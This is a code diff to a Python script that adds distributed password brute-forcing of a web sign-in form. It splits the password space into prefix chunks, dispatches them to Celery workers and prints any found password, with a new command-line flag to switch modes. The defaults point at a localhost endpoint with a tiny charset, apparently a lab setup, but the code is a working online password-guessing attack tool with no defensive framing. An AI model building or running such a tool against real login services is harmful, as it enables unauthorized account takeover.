@@ -14,6 +14,27 @@ import csv
 import sys
 import os
 from math import prod
+from tasks import app, brute_force_chunk
+from celery import group
+import math
+
+# --- Import config ---
+try:
+    from config import CELERY_BROKER_URL, CELERY_RESULT_BACKEND, CHARSET, MIN_LEN, MAX_LEN, USERNAME, TARGET_URL, PASSWORD_FIELD, USERNAME_FIELD, TIMEOUT
+except ImportError:
+    # fallback for direct script usage
+    CELERY_BROKER_URL = 'redis://localhost:6379/0'
+    CELERY_RESULT_BACKEND = 'redis://localhost:6379/0'
+    CHARSET = "abc"
+    MIN_LEN = 1
+    MAX_LEN = 5
+    USERNAME = "testuser@gmail.com"
+    TARGET_URL = "http://127.0.0.1:5000/signin"
+    PASSWORD_FIELD = "password"
+    USERNAME_FIELD = "username"
+    TIMEOUT = 10
+
+
 
 # ================== CONFIG ==================
 TARGET_URL = "http://127.0.0.1:5000/signin"  # endpoint that accepts username+password
@@ -96,6 +117,44 @@ def attempt(session, password):
     # otherwise: treat as failure
     return False, status, reason or "no_success_indicators"
 
+
+# --- Helper: split prefixes for chunking ---
+def get_prefixes(length, num_workers):
+    charset_size = len(CHARSET)
+    if length <= 2 or charset_size ** length <= num_workers:
+        return [""]
+    prefix_len = min(length, math.ceil(math.log(num_workers) / math.log(charset_size)))
+    return ["".join(p) for p in itertools.product(CHARSET, repeat=prefix_len)]
+
+# --- Celery Task: chunked brute-force ---
+
+
+# --- Distributed main ---
+def distributed_bruteforce(num_workers):
+    print(f"Distributed brute-force: charset={CHARSET}, min_len={MIN_LEN}, max_len={MAX_LEN}, workers={num_workers}")
+    for length in range(MIN_LEN, MAX_LEN + 1):
+        prefixes = get_prefixes(length, num_workers)
+        print(f"Length {length}: {len(prefixes)} chunks")
+        tasks = [
+            brute_force_chunk.s(
+                USERNAME, TARGET_URL, PASSWORD_FIELD, USERNAME_FIELD,
+                CHARSET, length, prefix, TIMEOUT
+            )
+            for prefix in prefixes
+        ]
+        job = group(tasks)
+        result = job.apply_async()
+        print(f"Submitted {len(prefixes)} tasks for length {length}. Waiting for results...")
+        found = None
+        for res in result.get():
+            if res:
+                found = res
+                break
+        if found:
+            print(f"+++ FOUND password: {found}")
+            return found
+    print("Password not found in distributed search.")
+    return None
 
 # ----------------- main runner -----------------
 def main():
@@ -188,5 +247,14 @@ def main():
 
     print("Finished. Attempts:", count)
 
+# --- CLI Entrypoint ---
 if __name__ == "__main__":
-    main()
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--distributed", action="store_true", help="Use distributed Celery brute-force")
+    parser.add_argument("--workers", type=int, default=4, help="Number of workers/chunks")
+    args = parser.parse_args()
+    if args.distributed:
+        distributed_bruteforce(args.workers)
+    else:
+        main()
